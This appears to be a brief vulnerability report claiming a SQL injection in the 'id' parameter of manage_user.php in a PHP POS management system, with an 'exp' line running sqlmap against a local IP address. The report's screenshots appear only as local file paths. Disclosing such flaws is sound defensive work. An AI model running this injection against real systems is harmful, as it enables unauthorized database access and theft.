vendor：https://www.sourcecodester.com/

download link：https://www.sourcecodester.com/php/16127/best-pos-management-system-php.html

Vulnerability trigger parameter: $id

The process of vulnerability discovery is as follows：

![image-20230223220119515](C:\markdown\images\image-20230223220119515.png)

exp

```
sqlmap.py -u "http://192.168.31.50/kruxton/manage_user.php?id=1"
```

![image-20230223220036687](C:\markdown\images\image-20230223220036687.png)